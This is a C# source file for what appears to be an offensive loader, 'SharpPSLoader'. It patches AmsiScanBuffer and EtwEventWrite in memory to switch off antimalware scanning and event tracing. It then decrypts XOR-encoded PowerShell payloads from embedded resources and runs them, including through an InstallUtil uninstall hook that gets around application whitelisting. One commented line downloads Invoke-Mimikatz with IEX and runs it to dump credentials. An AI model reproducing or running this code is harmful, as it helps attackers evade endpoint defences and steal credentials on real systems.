using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections;
using System.Runtime.InteropServices;
using System.IO;
using System.Reflection;

/*
 * Add reference to c:\windows\assembly\gac_msil\system.management.automation\1.0.0.0\<~>\system.management.automation.dll  and configuration.install 
 * 
 * "Any CPU" --> installutils works, running assembly through main() fail. 
 * "x64" --> installutils works, running assembly through main() works.
 * 
 * C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U <test.exe>
 * 
 * Adding Resources 
 *  - Project > Properties > Add Resources > Access Modifier = Public 
 *  - And simply access it like... var thingy = Properties.Resources.<resource-name>
 *      - Returns "type" by default. ex) .txt file ==> string, byte file ==> byte[] 
 * 
 * TODO: 
 *  1. DInvoke or peb parsing 
 *  2. Embed more powershell scripts
 * 
 * */

namespace SharpPSLoader
{
    public class SharpPSLoader
    {
        // Decrypting with single byte, hardcoding "0x6f = (111)" as default key, for now. 
        public static string DecryptAndStringReturn(byte[] payload, byte singleByteKey = 0x6f)
        {
            byte[] result = new byte[payload.Length];
            for(int i = 0; i < payload.Length; i++)
            {
                result[i] = (byte)(payload[i] ^ singleByteKey);
            }

            var resultStr = Encoding.UTF8.GetString(result);

            return resultStr;
        }

        // Array of 
        // https://stackoverflow.com/questions/1310812/how-can-i-find-all-the-members-of-a-properties-resources-in-c-sharp


        public static string ParseFunctionName(string payload)
        {
            var lines = payload.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
            string functionName = "";
            foreach (var line in lines)
            {
                //Console.WriteLine(line);
                if (line.ToLower().Contains("function"))
                {
                    functionName = line.Split(' ')[1];
                    break;
                }
            }

            return functionName;
        }

        public static bool is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        // Return required bytes for patching 
        public static byte[] GetPatchBytes(string function)
        {
            byte[] patch;
            List<byte> patchList = new List<byte>();
            if (function.ToLower() == "bypasstw")
            {
                if (is64Bit)
                {
                    patch = new byte[2];
                    patch[0] = 0xc3;
                    patch[1] = 0x00;
                }
                else
                {
                    patch = new byte[3];
                    patch[0] = 0xc2;
                    patch[1] = 0x14;
                    patch[2] = 0x00;
                }

                // Returning for bypassEtw 
                return patch;
            }

            else if (function.ToLower() == "bypasssi")
            {

                if (is64Bit)
                {
                    patchList = new List<byte>();
                    patchList.Add(0xB8);
                    patchList.Add(0x90);
                    patchList.Add(0x57);
                    patchList.Add(0x00);
                    patchList.Add(0x07);
                    patchList.Add(0x90);
                    patchList.Add(0x80);
                    patchList.Add(0xC3);
                    patchList.RemoveAll(b => b == 0x90);
                }
                else
                {
                    patchList = new List<byte>();
                    patchList.Add(0xB8);
                    patchList.Add(0x90);
                    patchList.Add(0x57);
                    patchList.Add(0x00);
                    patchList.Add(0x07);
                    patchList.Add(0x90);
                    patchList.Add(0x80);
                    patchList.Add(0xC2);
                    patchList.Add(0x90);
                    patchList.Add(0x18);
                    patchList.Add(0x00);
                    patchList.RemoveAll(b => b == 0x90);
                }

                var patchArr = patchList.ToArray();
                return patchArr;
            }

            else
            {
                throw new ArgumentException("[-] Incorrect function name argument");
            }
        }

        public void bypassTW()
        {
            string ntdll = "ntdll.dll";
            string magicFunction = "EtwEventWrite";

            IntPtr ntdllAddr = LoadLibrary(ntdll);
            IntPtr etwWriteEventAddr = GetProcAddress(ntdllAddr, magicFunction);

            byte[] magicVoodoo = GetPatchBytes("bypasstw");

            // out uint oldProtect is a nice trick, never knew that 
            VirtualProtect(etwWriteEventAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, etwWriteEventAddr, magicVoodoo.Length);
            VirtualProtect(etwWriteEventAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);

            Console.WriteLine("[+] Disabled ETW Tracing");
        }

        public void bypassSI()
        {
            string amsidll = "a" + "msi" + ".d" + "ll";
            string amsiScanBuffer = "Am" + "siSc" + "anB" + "uffer";

            IntPtr amsidllAddr = LoadLibrary(amsidll);
            IntPtr amsiScanBufferAddr = GetProcAddress(amsidllAddr, amsiScanBuffer);

            byte[] magicVoodoo = GetPatchBytes("bypasssi");

            VirtualProtect(amsiScanBufferAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, amsiScanBufferAddr, magicVoodoo.Length);
            VirtualProtect(amsiScanBufferAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);

            Console.WriteLine("[+] Disabled AMSI");
        }

        public void RunPowershell(string payload, string argument = "")
        {
            // Powershell payload goes here. Might be replaced with taking powershell from resources. 
            // Use dnlib for resources section? Or just xor powershell + base64 as a static variable here? not sure. 
            //String cmd = @"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -command 'coffee'";

            string cmd = payload;

            // Parse for "function" and retrieve the function name here and add to cmd 
            // Why parse functionName? Because simply typing "Invoke-Mimikatz -DumpCred" will trigger amsi. 
            var functionName = ParseFunctionName(cmd);

            // If argument, add functionName and argument 
            if (!string.IsNullOrEmpty(argument))
            {
                cmd += ";";
                cmd += functionName;
                cmd += " ";
                cmd += argument;
            }
            

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            var results = ps.Invoke();

            // Result is 0, powershell errored out. 
            if(results.Count == 0)
            {
                Console.WriteLine("[-] Powershell returned error");
                return;
            }

            // Result is not 0, at least something returned. 
            foreach(var obj in results)
            {
                if (obj != null)
                { 
                    Console.WriteLine(obj.BaseObject.ToString());
                }
            }

            rs.Close();
        }

        // Empty constructor for now 
        public SharpPSLoader()
        {
            
        }
       

        public static void Main(string[] args)
        {
            Console.WriteLine("[+] Starting from main! ");

            SharpPSLoader psLoader = new SharpPSLoader();
            psLoader.bypassSI();
            psLoader.bypassTW();
            //Console.ReadLine();

            // Parse argument and then change psloader.mimiStr to corresponding script 

            //var thing = Properties.Resources.;

            // Function that returns array of property.Name, 
            foreach (PropertyInfo property in typeof(Properties.Resources).GetProperties
                (BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic))
            {
                Console.WriteLine("{0}: {1}", property.Name, property.GetValue(null, null));
            }

            //psLoader.RunPowershell(psLoader.mimiStr, args[0]);
            Console.ReadLine();
        }


        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
        string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);


    }

    
    /*
     * 1. Parse payload type (1~5) 
     * 2. Retrieve payload from the resources section 
     * 3. Single XOR decrypt using "111" hardcoded key 
     * 4. Invoke it
     * 
     * */
    [System.ComponentModel.RunInstaller(true)]
    public class Sample: System.Configuration.Install.Installer
    {
        SharpPSLoader psLoader = new SharpPSLoader();


        public override void Uninstall(IDictionary savedState)
        {
            //var psPayload = this.Context.Parameters["p"];
            //Console.WriteLine(psPayload.ToString());

            psLoader.bypassSI();
            psLoader.bypassTW();
            //psLoader.RunPowershell();

            
        }
    }


}

